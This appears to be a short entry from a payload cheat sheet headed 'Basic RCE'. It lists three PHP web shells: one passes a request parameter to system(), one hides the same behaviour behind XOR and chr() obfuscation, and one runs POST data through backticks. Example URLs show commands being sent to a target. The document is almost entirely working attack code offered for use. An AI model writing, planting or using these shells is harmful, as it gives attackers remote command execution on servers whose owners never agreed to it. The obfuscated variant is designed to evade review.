# Basic RCE
```
<?php echo "Naif Says \n"; system ($_REQUEST['cmd']); ?>
- http://target.com/path/to/shell.php?cmd=command

<?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
- http://target.com/path/to/shell.php?0=command

<?=`$_POST[0]`?>
```

